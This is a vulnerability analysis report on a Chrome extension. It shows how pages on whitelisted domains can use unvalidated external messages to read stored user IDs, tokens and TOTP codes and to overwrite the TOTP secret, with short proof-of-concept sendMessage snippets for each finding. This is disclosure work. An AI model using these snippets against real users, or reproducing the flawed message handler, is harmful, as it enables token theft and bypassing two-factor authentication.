# CoCo Analysis: ehnilmdfonpfpakhbchmpjbikfipaolj

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 5

---

## Sink 1: storage_sync_get_source → sendResponseExternal_sink (getUserId)

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/ehnilmdfonpfpakhbchmpjbikfipaolj/opgen_generated_files/bg.js
Line 991    sendResponse({userId: items.userid});

**Code:**

```javascript
// Background script - bg.js (lines 986-993)
chrome.runtime.onMessageExternal.addListener(
    function (request, sender, sendResponse) {
        if (request.command) {
            if (request.command == "getUserId") {
                chrome.storage.sync.get('userid', function(items) {
                    sendResponse({userId: items.userid}); // ← Leaks stored userid
                });
                return true;
            }
        }
    }
);
```

**Classification:** TRUE POSITIVE

**Attack Vector:** External messages via chrome.runtime.onMessageExternal

**Attack:**

```javascript
// From a whitelisted domain (*.verug.com or *.anygaming.co)
chrome.runtime.sendMessage('ehnilmdfonpfpakhbchmpjbikfipaolj',
    {command: "getUserId"},
    function(response) {
        console.log("Leaked userid:", response.userId);
    }
);
```

**Impact:** Information disclosure - external domains can read the user's stored userid token.

---

## Sink 2: storage_sync_get_source → sendResponseExternal_sink (getOTP)

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/ehnilmdfonpfpakhbchmpjbikfipaolj/opgen_generated_files/bg.js
Line 997    var timeCode = totp.getOtp(items.totpsecret);

**Code:**

```javascript
// Background script - bg.js (lines 994-1000)
else if (request.command == "getOTP") {
    chrome.storage.sync.get('totpsecret', function(items) {
        var totp = new jsOTP.totp();
        var timeCode = totp.getOtp(items.totpsecret); // ← Uses stored TOTP secret
        sendResponse({otp: timeCode}); // ← Leaks generated OTP
    });
    return true;
}
```

**Classification:** TRUE POSITIVE

**Attack Vector:** External messages via chrome.runtime.onMessageExternal

**Attack:**

```javascript
// From a whitelisted domain (*.verug.com or *.anygaming.co)
chrome.runtime.sendMessage('ehnilmdfonpfpakhbchmpjbikfipaolj',
    {command: "getOTP"},
    function(response) {
        console.log("Leaked OTP:", response.otp);
        // Attacker can now use this OTP to bypass 2FA
    }
);
```

**Impact:** Critical security vulnerability - external domains can retrieve time-based one-time passwords (TOTP), completely bypassing two-factor authentication.

---

## Sink 3: bg_chrome_runtime_MessageExternal → chrome_storage_sync_set_sink (writeOTP)

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/ehnilmdfonpfpakhbchmpjbikfipaolj/opgen_generated_files/bg.js
Line 1002    chrome.storage.sync.set({totpsecret: request.secret});

**Code:**

```javascript
// Background script - bg.js (lines 1001-1002)
else if (request.command == "writeOTP") {
    chrome.storage.sync.set({totpsecret: request.secret}); // ← Attacker-controlled TOTP secret
}
```

**Classification:** TRUE POSITIVE

**Attack Vector:** External messages via chrome.runtime.onMessageExternal

**Attack:**

```javascript
// From a whitelisted domain (*.verug.com or *.anygaming.co)
// Step 1: Poison the TOTP secret
chrome.runtime.sendMessage('ehnilmdfonpfpakhbchmpjbikfipaolj',
    {command: "writeOTP", secret: "ATTACKERCONTROLLEDSECRET"}
);

// Step 2: Retrieve generated OTPs using the poisoned secret
chrome.runtime.sendMessage('ehnilmdfonpfpakhbchmpjbikfipaolj',
    {command: "getOTP"},
    function(response) {
        console.log("OTP from poisoned secret:", response.otp);
    }
);
```

**Impact:** Complete storage exploitation chain - attacker can write arbitrary TOTP secret and then retrieve OTPs generated from it, effectively hijacking the user's 2FA mechanism.

---

## Sink 4: bg_chrome_runtime_MessageExternal → chrome_storage_sync_set_sink (writeUserToken)

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/ehnilmdfonpfpakhbchmpjbikfipaolj/opgen_generated_files/bg.js
Line 1004    chrome.storage.sync.set({usertoken: request.token});

**Code:**

```javascript
// Background script - bg.js (lines 1003-1004)
else if (request.command == "writeUserToken") {
    chrome.storage.sync.set({usertoken: request.token}); // ← Attacker-controlled token
}
```

**Classification:** TRUE POSITIVE

**Attack Vector:** External messages via chrome.runtime.onMessageExternal

**Attack:**

```javascript
// From a whitelisted domain (*.verug.com or *.anygaming.co)
// Step 1: Poison the user token
chrome.runtime.sendMessage('ehnilmdfonpfpakhbchmpjbikfipaolj',
    {command: "writeUserToken", token: "malicious_token"}
);

// Step 2: Retrieve the poisoned token
chrome.runtime.sendMessage('ehnilmdfonpfpakhbchmpjbikfipaolj',
    {command: "getUserToken"},
    function(response) {
        console.log("Retrieved token:", response.usertoken);
    }
);
```

**Impact:** Complete storage exploitation chain - attacker can write and retrieve arbitrary user tokens.

---

## Sink 5: storage_sync_get_source → sendResponseExternal_sink (getUserToken)

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/ehnilmdfonpfpakhbchmpjbikfipaolj/opgen_generated_files/bg.js
Line 1007    sendResponse({usertoken: items.usertoken});

**Code:**

```javascript
// Background script - bg.js (lines 1005-1010)
else if (request.command == "getUserToken") {
    chrome.storage.sync.get('usertoken', function(items) {
        sendResponse({usertoken: items.usertoken}); // ← Leaks stored user token
    });
    return true;
}
```

**Classification:** TRUE POSITIVE

**Attack Vector:** External messages via chrome.runtime.onMessageExternal

**Attack:**

```javascript
// From a whitelisted domain (*.verug.com or *.anygaming.co)
chrome.runtime.sendMessage('ehnilmdfonpfpakhbchmpjbikfipaolj',
    {command: "getUserToken"},
    function(response) {
        console.log("Leaked usertoken:", response.usertoken);
    }
);
```

**Impact:** Information disclosure - external domains can read the user's stored authentication token.

---

## Overall Security Assessment

This extension has critical vulnerabilities allowing whitelisted domains (*.verug.com and *.anygaming.co) to:
1. Read sensitive data (userid, usertoken, TOTP codes)
2. Write/poison storage with malicious values
3. Completely bypass two-factor authentication by retrieving TOTP codes
4. Execute complete storage exploitation chains (write → read)

The vulnerabilities exist because chrome.runtime.onMessageExternal accepts messages from the whitelisted domains without validating the requested operations or protecting sensitive data.
